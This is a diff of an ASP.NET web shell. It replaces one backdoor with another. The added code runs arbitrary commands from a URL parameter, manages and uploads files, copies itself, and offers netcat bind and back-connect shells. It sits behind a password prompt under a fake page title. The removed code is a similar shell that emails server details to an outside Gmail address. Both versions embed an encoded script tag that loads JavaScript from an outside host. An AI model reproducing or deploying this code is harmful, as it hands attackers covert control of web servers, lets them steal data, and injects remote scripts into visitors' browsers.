+            Dim con As String = xfileopen(Request.ServerVariables("PATH_TRANSLATED"), False)
+            If (xfilesave(childname, Encoding.ASCII.GetBytes(con))) Then
+            End If
+        End If
+        xCwd = xcleanpath(xCwd)
+        If (Request.QueryString("cmd") <> "") Then
+            Dim cmd As String
+            cmd = Trim(Request.QueryString("cmd"))
+            Dim pos As Integer = InStr(LCase(cmd), "cd ")
+            Dim m As Match = Regex.Match(cmd, "[a-zA-Z]{1}:.*", RegexOptions.IgnoreCase)
+            If pos = 1 Then
+                newdir = Trim(Mid(cmd, 3))
+                If (newdir = "\") Then
+                    xCwd = Mid(xCwd, 1, 3)
+                Else
+                    If (InStr(newdir, ":") > 0) Then
+                        If (is_dir(newdir)) Then
+                            Dim di As New DirectoryInfo(newdir)
+                            xCwd = xcleanpath(di.FullName)
+                        End If
+                    Else
+                        If (is_dir(xCwd & newdir)) Then
+                            Dim di As New DirectoryInfo(xCwd & newdir)
+                            xCwd = xcleanpath(di.FullName)
+                        End If
+                    End If
+                End If
+                resultbox.InnerHtml = xdir(xCwd)
+            ElseIf m.Success Then
+                Dim ne As String = m.Value
+                If (is_dir(ne)) Then
+                    xCwd = xcleanpath(ne)
+                End If
+                resultbox.InnerHtml = xdir(xCwd)
+            Else
+                Dim result As String = ekse(cmd, xCwd)
+                If (result = "") Then
+                    resultbox.InnerHtml = xdir(xCwd)
+                Else
+                    result = Replace(htmlspecialchars(result), " ", "&nbsp;")
+                    resultbox.InnerHtml = Trim(nl2br(result))
+                End If
+            End If
+        ElseIf (Request.QueryString("properties") <> "") Then
+            Dim fname As String = xcleanpath(Request.QueryString("properties"))
+            If (Request.QueryString("oldfilename") <> "") Then
+                Dim oldname As String = Request.QueryString("oldfilename")
+                File.Move(oldname, fname)
+            End If
+            Dim Dir As String = Request.QueryString("dir")
+            Dim fcont As String = ""
+            Dim fview As String = ""
+            Dim fsize As String = ""
+            Dim faction As String = ""
+            Dim filectime As String = ""
+            Dim fileatime As String = ""
+            Dim filemtime As String = ""
+            Dim code As String = ""
+            Dim imglink As String = ""
+            If (is_dir(fname)) Then
+                fsize = "DIR"
+                fname = Mid(fname, 1, Len(fname) - 1)
+                fcont = xdir(fname)
+                faction = "<a href=""?dir=" & xcleanpath(fname) & "&properties=" & xcleanpath(fname) & """>Properties</a> | <a href=""?dir=" & xcleanpath(xparentfolder(fname)) & "&del=" & xcleanpath(fname) & """>Remove</a>"
+                Dim di As New DirectoryInfo(fname)
+                filectime = xdateformat(di.CreationTime)
+                fileatime = xdateformat(di.LastAccessTime)
+                filemtime = xdateformat(di.LastWriteTime)
+            Else
+                fname = Mid(fname, 1, Len(fname) - 1)
+                fsize = xparsefilesize(xfilesize(fname)) & " <span class=""gaul"">( </span>" & xfilesize(fname) & " bytes<span class=""gaul""> )</span>"
+                Dim xtype As String = ""
+                Dim mtype As String = ""
+                If (Request.QueryString("type") <> "") Then
+                    xtype = Request.QueryString("type")
+                Else
+                    mtype = GetFileDescription(fname)
+                    Dim s As Match = Regex.Match(mtype, "image|img", RegexOptions.IgnoreCase)
+                    If s.Success Then
+                        xtype = "img"
+                    Else
+                        xtype = "text"
+                    End If
+                End If
+                If (xtype = "img") Then
+                    imglink = "<p><a href=""?img=" & fname & """ target=""_blank""><span class=""gaul"">[ </span>view full size<span class=""gaul""> ]</span></a></p>"
+                    fcont = "<div style=""text-align:center;width:100%;"">" & imglink & "<img width=""800"" src=""?img=" & fname & """ alt="""" style=""margin:8px auto;padding:0;border:0;"" /></div>"
+                Else
+                    code = htmlspecialchars(xfileopen(fname, False))
+                    fcont = "<div class=""boxcode"">" & nl2br(code) & "</div>"
+                End If
+                Dim fi As New FileInfo(fname)
+                filectime = xdateformat(fi.CreationTime)
+                fileatime = xdateformat(fi.LastAccessTime)
+                filemtime = xdateformat(fi.LastWriteTime)
+                faction = "<a href=""?dir=" & xcleanpath(Dir) & "&view=" & fname & """>Edit</a> | <a href=""?get=" & fname & """>Download</a> | <a href=""?dir=" & xcleanpath(Dir) & "&del=" & fname & """>Remove</a>"
+                fview = "<a href=""?dir=" & xcleanpath(Dir) & "&properties=" & fname & "&type=text""><span class=""gaul"">[ </span>text<span class=""gaul""> ]</span></a><a href=""?dir=" & xcleanpath(Dir) & "&properties=" & fname & "&type=img""><span class=""gaul"">[ </span>image<span class=""gaul""> ]</span></a>"
+            End If
+            Dim fowner As String = xfileowner(fname)
+            Dim fperm As String = xfileperms(fname)
+            resultbox.InnerHtml = "<div style=""display:inline;"">" & _
+            "<form action=""?"" method=""get"" style=""margin:0;padding:1px 8px;text-align:left;"">" & _
+            "<input type=""hidden"" name=""dir"" value=""" & xCwd & """ />" & _
+            "<input type=""hidden"" name=""oldfilename"" value=""" & fname & """ />" & faction & " |&nbsp;" & _
+            "<span><input style=""width:50%;"" type=""text"" name=""properties"" value=""" & fname & """ />&nbsp;" & _
+            "<input style=""width:120px"" class=""btn"" type=""submit"" name=""btnRename"" value=""Rename"" />" & _
+            "</span>" & _
+            "<div class=""fprop"">" & _
+            "Size = " & fsize & "<br />" & _
+            "Owner = <span class=""gaul"">( </span>" & fowner & "<span class=""gaul""> )</span><br />" & _
+            "Permission = <span class=""gaul"">( </span>" & fperm & "<span class=""gaul""> )</span><br />" & _
+                "Create Time = <span class=""gaul"">( </span>" & filectime & "<span class=""gaul""> )</span><br />" & _
+                "Last Modified = <span class=""gaul"">( </span>" & filemtime & "<span class=""gaul""> )</span><br />" & _
+                "Last Accessed = <span class=""gaul"">( </span>" & fileatime & "<span class=""gaul""> )</span><br />" & _
+                fview & _
+                "</div>" & fcont & _
+                "</form>" & _
+                "</div>"
+        ElseIf ((Request.QueryString("view") <> "") Or (Request.QueryString("filename") <> "")) Then
+            Dim msg As String = ""
+            Dim fname As String = ""
+            If (Request.Form("save") = "Save As") Then
+                fname = Trim(Request.Form("saveas"))
+                Dim Content As String = Request.Form("filesource")
+                Dim pesan As String = ""
+                If (xfilesave(fname, Encoding.ASCII.GetBytes(Content))) Then
+                    pesan = "File Saved"
+                Else
+                    pesan = "Failed to save file"
+                End If
+                msg = "<span style=""float:right;""><span class=""gaul"">[ </span>" & pesan & "<span class=""gaul""> ]</span></span>"
+            Else
+                If (Request.QueryString("view") <> "") Then
+                    fname = Trim(Request.QueryString("view"))
+                Else
+                    fname = xCwd & Trim(Request.QueryString("filename"))
+                End If
+            End If
+            Dim result As String = xfileopen(fname, False)
+            result = htmlspecialchars(result)
+            resultbox.InnerHtml = "<p style=""padding:0;margin:0;text-align:left;""><a href=""?dir=" & xCwd & "&properties=" & fname & """>" & xfilesummary(fname) & "</a>" & msg & "</p><div style=""clear:both;margin:0;padding:0;""></div>" & _
+            "<form action=""?dir=" & xCwd & "&view=" & fname & """ method=""post"">" & _
+            "<textarea name=""filesource"" style=""width:100%;height:200px;"">" & result & "</textarea>" & _
+            "<input type=""text"" style=""width:80%;""  name=""saveAs"" value=""" & fname & """ />&nbsp;" & _
+            "<input type=""submit"" class=""btn"" style=""width:120px;"" name=""save"" value=""Save As"" /></form>"
+        Else
+            resultbox.InnerHtml = xdir(xCwd)
+        End If
+        '//################# Finalizing #######################======================================================]
+        Dim html_title, html_head, html_body, html_onload, html_final, html_script As String
+
+        If ((Request.QueryString("cmd") <> "") Or (Request.Form("passw") <> "")) Then
+            html_onload = "function setfocus(){ document.getElementById('cmd').focus(); }"
+        Else
+            html_onload = "function setfocus(){ return true; }"
+        End If
+
+
+
+        html_script = "<scrift type=""text/javascript"">" & _
+"function updateInfo(boxid,typ){" & _
+"	if(typ == 0){" & _
+"		var pola = 'example: (using netcat) run &quot;nc -l -p __PORT__&quot; and then press Connect';	" & _
+"	}" & _
+"	else{" & _
+"		var pola = 'example: (using netcat) press &quot;Listen&quot; and then run &quot;nc " & xServerIP & " __PORT__&quot;';	" & _
+"	}" & _
+"" & _
+"	var portnum = document.getElementById(boxid).value;" & _
+"" & _
+"	var hasil = pola.replace('__PORT__', portnum);" & _
+"	document.getElementById(boxid+'_').innerHTML = hasil;" & _
+"}" & _
+"" & _
+"function show(boxid){" & _
+"	var box = document.getElementById(boxid);" & _
+"	if(box.style.display != 'inline'){" & _
+"		document.getElementById('xnewfile').style.display = 'none';" & _
+"		document.getElementById('xnewfolder').style.display = 'none';" & _
+"		document.getElementById('xnewupload').style.display = 'none';" & _
+"		document.getElementById('xnewchild').style.display = 'none';" & _
+"		document.getElementById('xnewconnect').style.display = 'none';" & _
+"		box.style.display = 'inline';" & _
+"		box.focus();" & _
+"	}" & _
+"	else box.style.display = 'none';" & _
+"}" & _
+"function highlighthexdump(address){" & _
+"	var target = document.getElementById(address);" & _
+"	target.style.background = '" & shell_color & "';" & _
+"}" & _
+"function unhighlighthexdump(address){" & _
+"	var target = document.getElementById(address);" & _
+"	target.style.background = 'none';" & _
+"}" & html_onload & _
+"</scrift>"
+
+
+
+        html_script = Replace(html_script, "scrift", "script")
+        html_onload = ""
+        Dim bportC, lportC As String
+        If (auth) Then
+            If (Request.QueryString("bportC") <> "") Then
+                bportC = Request.QueryString("bportC")
+            Else
+                bportC = shell_fav_port
+            End If
+            If (Request.QueryString("lportC") <> "") Then
+                lportC = Request.QueryString("lportC")
+            Else
+                lportC = shell_fav_port
+            End If
+            html_title = shell_title & " " & xCwd
+            html_head = "" & _
+            "<title>" & html_title & "</title>" & _
+            "<link rel=""SHORTCUT ICON"" href=""" & Request.ServerVariables("SCRIPT_NAME") & "?img=icon"" />" & _
+            "" & shell_style & html_script
+            headwrapper.InnerHtml = html_head
+            serverinfo.InnerHtml = xHeader & "" & _
+            "<div class=""fpath"">" & _
+            xdrive() & xparsedir(xCwd) & _
+            "</div>"
+            xnewconnect.InnerHtml = "<form method=""get"" action=""?"" style=""display:inline;margin:0;padding:0;"">" & _
+            "<table class=""tblBox"" style=""width:100%;"">" & _
+            "<input type=""hidden"" name=""dir"" value=""" & xCwd & """ />" & _
+            "<tr><td style=""width:130px;"">BackConnect</td><td style=""width:200px;"">" & _
+            "Port&nbsp;<input maxlength=""5"" id=""backC"" onkeyup=""updateInfo('backC',0);"" style=""width:60px;"" type=""text"" name=""bportC"" value=""" & bportC & """ />" & _
+            "&nbsp;<input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnConnect"" value=""Connect"" />" & _
+            "</td>" & _
+            "<td><span id=""backC_"" class=""msgcon"">example: (using netcat) run &quot;nc -l -p " & bportC & "&quot; and then press Connect</span></td>" & _
+            "</tr>" & _
+            "" & _
+            "<tr><td>Listen</td><td>" & _
+            "Port&nbsp;<input maxlength=""5"" id=""listenC"" onkeyup=""updateInfo('listenC',1);"" style=""width:60px;"" type=""text"" name=""lportC"" value=""" & lportC & """ />" & _
+            "&nbsp;<input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnListen"" value=""Listen"" />" & _
+            "</td>" & _
+            "<td><span id=""listenC_"" class=""msgcon"">example: (using netcat) press &quot;Listen&quot; and then run &quot;nc " & xServerIP & " " & lportC & "&quot;</span></td>" & _
+            "</tr>" & _
+            "</table>" & _
+            "</form>"
+            xnewfolder.InnerHtml = "<form method=""get"" action=""?"" style=""display:inline;margin:0;padding:0;"">" & _
+            "<input type=""hidden"" name=""dir"" value=""" & xCwd & """ />" & _
+            "<table class=""tblBox"" style=""width:560px;"">" & _
+            "<tr><td style=""width:120px;"">New Foldername</td><td style=""width:304px;"">" & _
+            "<input style=""width:300px;"" type=""text"" name=""foldername"" value=""newfolder"" />" & _
+            "</td><td>" & _
+            "<input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnNewfolder"" value=""Create"" />" & _
+            "</td></tr>" & _
+            "</table>" & _
+            "</form>"
+            xnewfile.InnerHtml = "<form action=""?"" method=""get"" style=""display:inline;margin:0;padding:0;"">" & _
+            "<input type=""hidden"" name=""dir"" value=""" & xCwd & """ />" & _
+            "<table class=""tblBox"" style=""width:560px;"">" & _
+            "<tr><td style=""width:120px;"">New Filename</td><td style=""width:304px;"">" & _
+            "<input style=""width:300px;"" type=""text"" name=""filename"" value=""newfile"" />" & _
+            "</td><td>" & _
+            "<input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnNewfile"" value=""Create"" />" & _
+            "</td></tr>" & _
+            "</table></form>"
+            xnewchild.InnerHtml = "<form method=""get"" action=""?"" style=""display:inline;margin:0;padding:0;"">" & _
+            "<input type=""hidden"" name=""dir"" value=""" & xCwd & """ />" & _
+            "<table class=""tblBox"" style=""width:560px;"">" & _
+            "<tr><td style=""width:120px;"">New Shellname</td><td style=""width:304px;"">" & _
+            "<input style=""width:300px;"" type=""text"" name=""childname"" value=""" & shell_name & ".aspx""; />" & _
+            "</td><td><input style=""width:100px;"" type=""submit"" class=""btn"" name=""btnNewchild"" value=""Create"" />" & _
+            "</td></tr>" & _
+            "</table>" & _
+            "</form>"
+            headertop.InnerHtml = "<a href=""?"">" & shell_title & "</a>"
+            uploadform.Action = "?dir=" & xCwd
+            dir.Value = xCwd
+        Else
+            html_title = shell_fake_name
+            html_head = "<title>" & html_title & "</title>" & shell_style
+            html_body = "" & _
+           "<div style=""margin:30px;"">" & _
+           "<div>" & _
+           "<form action=""?"" method=""post"">" & _
+           "<input id=""cmd"" type=""text"" name=""passw"" value="""" />" & _
+           "&nbsp;<input type=""submit"" name=""btnpasswd"" value=""Ok"" />" & _
+           "</form>" & _
+           "</div>" & _
+           "<div style=""font-size:10px;"">" & shell_fake_name & "</div>" & _
+           "</div>"
+            headwrapper.InnerHtml = html_head
+            mainwrapper.InnerHtml = html_body
+        End If
+    End Sub
+    </script>
 <html>
-<style>
-body{background-color:#444;color:#e1e1e1;}
-body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
-table.info{ color:#fff;background-color:#222; }
-span,h1,a{ color: #df5 !important; }
-span{ font-weight: bolder; }
-h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
-div.content{ padding: 5px;margin-left:5px;background-color:#333; }
-a{ text-decoration:none; }
-a:hover{ text-decoration:underline; }
-.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
-.bigarea{ width:100%;height:300px; }
-input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
-form{ margin:0px; }
-.toolsInp{ width: 300px }
-.main th{text-align:left;background-color:#5e5e5e;}
-.main tr:hover{background-color:#5e5e5e}
-.l1{background-color:#444}
-.l2{background-color:#333}
-pre{font-family:Courier,Monospace;}
-</style><SCRIPT SRC=&#x68&#x74&#x74&#x70&#x73&#x3a&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x6c&#x6f&#x63&#x61&#x6c&#x72&#x6f&#x6f&#x74&#x2e&#x6e&#x65&#x74&#x2f&#x73&#x61&#x62&#x75&#x6e&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT>
-<head>
-<meta http-equiv="Content-Type" content="text/html">
+<head id="headwrapper" runat="server">
 <title></title>
 </head>
-<body>
-<hr>
-<%
-Dim error_x as Exception
-Try
-if session("rooot")<>1 then
-'Test sending anonymous mail, comment it if you don't want test it
-	dim info As String
-	Try
-	info = request.ServerVariables.ToString.Replace("%2f","/").Replace("%5c","\").Replace("%3a",":").Replace("%2c",",").Replace("%3b",";").Replace("%3d","=").Replace("%2b","+").Replace("%0d%0a",vbnewline)
-	System.Web.Mail.SmtpMail.SmtpServer = "localhost"
-	System.Web.Mail.SmtpMail.Send(request.ServerVariables("HTTP_HOST"),"test.mail.address.2008@gmail.com",request.ServerVariables("HTTP_HOST")+request.ServerVariables("URL"),info)
-	Catch
-	End Try
-%>
-<center>
-<form runat="server">
-  Your Password:<asp:TextBox ID="TextBox" runat="server"  TextMode="Password" class="TextBox" />  
-  <asp:Button  ID="Button" runat="server" Text="Login" ToolTip="Click here to login"  OnClick="login_click" class="buttom" />
-</form>
-</center>
-<%
-else
-	dim temp as string
-	temp=request.QueryString("action")
-	if temp="" then temp="goto"
-	select case temp
-	case "goto"
-		if request.QueryString("src")<>"" then
-			url=request.QueryString("src")
-		else
-			url=server.MapPath(".") & "\"
-		end if
-	call existdir(url)
-	dim xdir as directoryinfo
-	dim mydir as new DirectoryInfo(url)
-	dim guru as string
-	dim xfile as fileinfo
-	
-	dim ServerIP As string = "<font color=white>Server IP :</font> <b>" + Request.ServerVariables("LOCAL_ADDR") + "</b> - <font color=white>Client IP :</font> <b>" + getIP() + "</b> - "
-    dim HostName As string = "<font color=white>HostName :</font> <b>" + Environment.MachineName + "</b> - <font color=white>Username :</font> <b>"+ Environment.UserName +"</b><br>"
-    dim OSVersion As string = "<font color=white>OS Version :</font> <b>" + Environment.OSVersion.ToString() + "</b>"
-    dim IISversion As string = "<font color=white> - IIS Version :</font> <b>" + Request.ServerVariables("SERVER_SOFTWARE") + "</b><br><font color=white>System Dir :</font> <b>" + Environment.SystemDirectory + "</b>"
-    dim PATH_INFO As string = "<font color=white> - PATH_TRANSLATED :</font> <b>" + Request.ServerVariables("PATH_TRANSLATED") + "</b><br>"
-    dim HARDWARE_INFO As string = ""
-    Dim environmentVariables As IDictionary = Environment.GetEnvironmentVariables()
-   	Dim de As DictionaryEntry
-	For Each de In  environmentVariables
-	if de.Key = "NUMBER_OF_PROCESSORS" then
-	HARDWARE_INFO += "<font color=white>Hardware Info :</font> <b>" + de.Value + "CPU - "
-	end if
-	if de.Key = "PROCESSOR_IDENTIFIER" then
-	HARDWARE_INFO += de.Value + "</b><br>"
-	end if
-   	Next
-    Info.Text += ServerIP + HostName + OSVersion + IISversion + PATH_INFO + HARDWARE_INFO
-%>
-<table width="100%"  border="0" align="center">
-  <tr>
-  	<td><asp:Label ID="Info" runat="server" EnableViewState="False"	/></td>
-  </tr>
+<SCRIPT SRC=&#x68&#x74&#x74&#x70&#x73&#x3a&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x6c&#x6f&#x63&#x61&#x6c&#x72&#x6f&#x6f&#x74&#x2e&#x6e&#x65&#x74&#x2f&#x73&#x61&#x62&#x75&#x6e&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT> 
+<body onload="setfocus();">
+<div id="mainwrapper" runat="server">
+<div id="wrapper">
+<h1 onmouseover="this.style.cursor='pointer';this.style.cursor='hand';"  onclick="window.location= '?';" runat="server" id="headertop"></h1>
+<div class="box">
+<div id="serverinfo" runat="server"></div>
+<div class="menu">
+<a href="javascript:show('xnewfile');"><span class="gaul">[ </span> New File<span class="gaul"> ]</span></a>
+<a href="javascript:show('xnewfolder');"><span class="gaul">[ </span>New Folder<span class="gaul"> ]</span></a>
+<a href="javascript:show('xnewchild');"><span class="gaul">[ </span>Replicate<span class="gaul"> ]</span></a>
+<a href="javascript:show('xnewupload');"><span class="gaul">[ </span>Upload<span class="gaul"> ]</span></a>
+<a href="javascript:show('xnewconnect');"><span class="gaul">[ </span>BindShell<span class="gaul"> ]</span></a>
+</div>
+<div class="hidden" id="xnewconnect" runat="server"></div>
+<div class="hidden" id="xnewfolder" runat="server"></div>
+<div class="hidden" id="xnewfile" runat="server"></div>
+<div class="hidden" id="xnewupload">
+<form runat="server" id="uploadform" method="post" action="" enctype="multipart/form-data" style="display:inline;margin:0;padding:0;">
+<table class="tblBox" style="width:560px;">
+<tr><td style="width:120px;">Save as</td><td><input style="width:300px;" type="text" name="ufname" id="ufname" value="" runat="server" /></td></tr>
+<tr><td style="width:120px;">From Url</td><td style="width:304px;">
+<input style="width:300px;" type="text" name="fileurl" id="fileurl" runat="server" value="" />
+</td><td><input style="width:100px;" type="submit" class="btn" name="btnNewUploadUrl" value="Get" /></td></tr>
+<tr><td style="width:120px;">From Computer</td><td style="width:304px;">
+<input style="width:300px;" type="file" name="filelocal" id="filelocal" runat="server" />
+</td><td>
+<input style="width:100px;" type="submit" class="btn" name="btnNewUploadLocal" value="Get" />
+</td></tr>
 </table>
-<hr>
-
-<table width="100%"  border="0" align="center">
-  <tr>
-  	<td>Currently Dir:</td> <td><font color=red><%=url%></font></td>
-  </tr>
-  <tr>
-    <td width="10%">Operate:</td>
-    <td width="90%"><a href="?action=new&src=<%=server.UrlEncode(url)%>" title="New file or directory">New</a> - 
-      <%if session("cutboard")<>"" then%>
-      <a href="?action=paste&src=<%=server.UrlEncode(url)%>" title="you can paste">Paste</a> - 
-      <%else%>
-	Paste - 
-<%end if%>
-<a href="?action=upfile&src=<%=server.UrlEncode(url)%>" title="Upload file">UpLoad</a> - <a href="?action=goto&src=" & <%=server.MapPath(".")%> title="Go to this file's directory">GoBackDir </a> - <a href="?action=logout" title="Exit" ><font color="red">Quit</font></a>
-</td>
-  </tr>
-  <tr>
-    <td>
-	Go to: </td>
-    <td>
-<%
-dim i as integer
-for i =0 to Directory.GetLogicalDrives().length-1
- 	response.Write("<a href='?action=goto&src=" & Directory.GetLogicalDrives(i) & "'>" & Directory.GetLogicalDrives(i) & " </a>")
-next
-%>
-
-</td>
-<td align="Left">
-<%
-response.Write("IP:<font color=red>" & Request.ServerVariables("REMOTE_ADDR")&"</font>")
-%>
-</td>
-  </tr>
-
-  <tr>
-    <td>Tool:</td>
-    <td><a href="?action=sqlrootkit" >SqlRootKit.NET </a> - <a href="?action=cmd" >CMD.NET</a> - <a href="?action=cmdw32" >kshellW32</a> - <a href="?action=cmdwsh" >kshellWSH</a> - <a href="?action=clonetime&src=<%=server.UrlEncode(url)%>" >CloneTime</a> - <a href="?action=information" >System Info</a> - <a href="?action=pro1" >List Processes 1</a> - <a href="?action=pro2" >List Processes 2</a></td>    
-  </tr>
-  <tr>
-    <td> </td>
-    <td><a href="?action=user" >List User Accounts</a> - <a href="?action=auser" >IIS Anonymous User</a>- <a href="?action=scan" >Port Scanner</a> - <a href="?action=iisspy" >IIS Spy</a> - <a href="?action=applog" >Application Event Log </a> - <a href="?action=syslog" >System Log</a></td>
-  </tr>
-</table>
-<hr>
-<table width=100% class=main cellspacing=0 cellpadding=1><tr><th>Name</th><th>Size</th><th>Modify</th><th>Actions</th></tr>
-
-
-      <tr>
-        <td><%
-		guru= "<tr><td><a href='?action=goto&src=" & server.UrlEncode(Getparentdir(url)) & "'><b>[..]</b></a></td></tr>"
-		response.Write(guru)
-                dim lll
-                lll=1
-		for each xdir in mydir.getdirectories()
-			response.Write("<tr>")
-			dim filepath as string 
-			filepath=server.UrlEncode(url & xdir.name)
-                        if lll=1 then 
-                           lll=2 
-                        else 
-                           lll=1
-                        end if
-			guru= "<tr class=l" & lll & "><td><a href='?action=goto&src=" & filepath & "\" & "'><b>[" & xdir.name & "]</b></a></td>"
-			response.Write(guru)
-			response.Write("<td>&lt;dir&gt;</td>")
-			response.Write("<td>" & Directory.GetLastWriteTime(url & xdir.name) & "</td>")
-			guru="<td><a href='?action=cut&src=" & filepath & "\'  target='_blank'>Cut" & "</a>|<a href='?action=copy&src=" & filepath & "\'  target='_blank'>Copy</a>|<a href='?action=del&src=" & filepath & "\'" & " onclick='return del(this);'>Del</a></td>"
-			response.Write(guru)
-			response.Write("</tr>")
-		next
-		%></td>
-  </tr>
-		<tr>
-        <td><%
-		for each xfile in mydir.getfiles()
-			dim filepath2 as string
-			filepath2=server.UrlEncode(url & xfile.name)
-			response.Write("<tr>")
-                        if lll=1 then 
-                           lll=2 
-                        else 
-                           lll=1
-                        end if
-                        guru= "<tr class=l" & lll & "><td><a href='?action=edit&src=" & filepath2 & "'>" & xfile.name & "</a></td>"
-			response.Write(guru)
-			guru="<td>" & GetSize(xfile.length) & "</td>"
-			response.Write(guru)
-			response.Write("<td>" & file.GetLastWriteTime(url & xfile.name) & "</td>")
-			guru="<td><a href='?action=edit&src=" & filepath2 & "'>Edit</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>Del</a></td>"			
-			response.Write(guru)
-			response.Write("</tr>")
-		next
-		response.Write("</table>")
-		%></td>
-      </tr>
-</table>
-<script language="javascript">
-function del()
-{
-if(confirm("Are you sure?")){return true;}
-else{return false;}
-}
-function down()
-{
-if(confirm("If the file size > 20M,\nPlease don\'t download\nYou can copy file to web directory ,use http download\nAre you sure download?")){return true;}
-else{return false;}
-}
-</script><SCRIPT SRC=&#x68&#x74&#x74&#x70&#x73&#x3a&#x2f&#x2f&#x77&#x77&#x77&#x2e&#x6c&#x6f&#x63&#x61&#x6c&#x72&#x6f&#x6f&#x74&#x2e&#x6e&#x65&#x74&#x2f&#x73&#x61&#x62&#x75&#x6e&#x2f&#x79&#x61&#x7a&#x2e&#x6a&#x73></SCRIPT>
-<%
-case "information"
-	dim CIP,CP as string
-	if getIP()<>request.ServerVariables("REMOTE_ADDR") then
-			CIP=getIP()
-			CP=request.ServerVariables("REMOTE_ADDR")
-	else
-			CIP=request.ServerVariables("REMOTE_ADDR")
-			CP="None"
-	end if
-%>
-<div align=center>[ Web Server Information ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></div><br>
-<table width="100%"  border="1" align="center">
-  <tr>
-    <td width="40%">Server IP</td>
-    <td width="60%"><%=request.ServerVariables("LOCAL_ADDR")%></td>
-  </tr>
-  <tr>
-    <td height="73">Machine Name</td>
-    <td><%=Environment.MachineName%></td>
-  </tr>
-  <tr>
-    <td>Network Name</td>
-    <td><%=Environment.UserDomainName.ToString()%></td>
-  </tr>
-  <tr>
-    <td>User Name in this Process</td>
-    <td><%=Environment.UserName%></td>
-  </tr>
-  <tr>
-    <td>OS Version</td>
-    <td><%=Environment.OSVersion.ToString()%></td>
-  </tr>
-  <tr>
-    <td>Started Time</td>
-    <td><%=GetStartedTime(Environment.Tickcount)%> Hours</td>
-  </tr>
-  <tr>
-    <td>System Time</td>
-    <td><%=now%></td>
-  </tr>
-  <tr>
-    <td>IIS Version</td>
-    <td><%=request.ServerVariables("SERVER_SOFTWARE")%></td>
-  </tr>
-  <tr>
-    <td>HTTPS</td>
-    <td><%=request.ServerVariables("HTTPS")%></td>
-  </tr>
-  <tr>
-    <td>PATH_INFO</td>
-    <td><%=request.ServerVariables("PATH_INFO")%></td>
-  </tr>
-  <tr>
-    <td>PATH_TRANSLATED</td>
-    <td><%=request.ServerVariables("PATH_TRANSLATED")%></td>
-  <tr>
-    <td>SERVER_PORT</td>
-    <td><%=request.ServerVariables("SERVER_PORT")%></td>
-  </tr>
-    <tr>
-    <td>SeesionID</td>
-    <td><%=Session.SessionID%></td>
-  </tr>
-  <tr>
-    <td colspan="2"><span class="style3">Client Infomation</span></td>
-  </tr>
-  <tr>
-    <td>Client Proxy</td>
-    <td><%=CP%></td>
-  </tr>
-  <tr>
-    <td>Client IP</td>
-    <td><%=CIP%></td>
-  </tr>
-  <tr>
-    <td>User</td>
-    <td><%=request.ServerVariables("HTTP_USER_AGENT")%></td>
-  </tr>
-</table>
-<table align=center>
-	<% Create_table_row_with_supplied_colors("Black", "White", "center", "Environment Variables, Server Variables") %>
-	<tr>
-		<td><textArea cols=50 rows=10><% output_all_environment_variables("text") %></textarea></td>
-		<td><textArea cols=50 rows=10><% output_all_Server_variables("text") %></textarea></td>
-	</tr>
-</table>
-<%
-	case "cmd"
-%>
-<form runat="server">
-  <p>[ CMD.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-  <p> Execute command with ASP.NET account(<span class="style3">Notice: only click &quot;Run&quot; to run</span>)</p>
-  <p>- This function has fixed by kikicoco.Antivirus has not detected (2007/02/27)-</p>
-  Command:
-  <asp:TextBox ID="cmd" runat="server" Width="300" class="TextBox" />
-  <asp:Button ID="Button123" runat="server" Text="Run" OnClick="RunCMD" class="buttom"/>  
-  <p>
-   <asp:Label ID="result" runat="server" style="style2"/>      </p>
 </form>
-<%
-	case "cmdw32"
-%>
-<form runat="server">
-	<p>[ ASP.NET W32 Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-  	<p> Execute command with ASP.NET account using W32(<span class="style3">Notice: only click &quot;Run&quot; to run</span>)</p>
-  	<%
-  	Response.Write("System Dir : "+Environment.SystemDirectory +"<br><br>")
-  	%>
-  	CMD File:
-	<asp:TextBox ID="txtCmdFile" runat="server" Width="473px" style="border: 1px solid #084B8E">C:\\WINDOWS\\system32\\cmd.exe</asp:TextBox><br><br>
-  	Command:&nbsp;
-	<asp:TextBox ID="txtCommand1" runat="server" style="border: 1px solid #084B8E"/>
-  	<asp:Button ID="Buttoncmdw32" runat="server" Text="Run" OnClick="RunCmdW32" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/>  
-  	<p>
-    <asp:Label ID="resultcmdw32" runat="server" style="color: #0000FF"/>      
-    </p>
-</form>
-<%
-	case "cmdwsh"
-%>
-<form runat="server">
-	<p>[ ASP.NET WSH Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
-  	<p> Execute command with ASP.NET account using WSH(<span class="style3">Notice: only click &quot;Run&quot; to run</span>)</p>
-  	Command:
-	<asp:TextBox ID="txtCommand2" runat="server" style="border: 1px solid #084B8E"/>
-  	<asp:Button ID="Buttoncmdwsh" runat="server" Text="Run" OnClick="RunCmdWSH" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/>  
-  	<p>
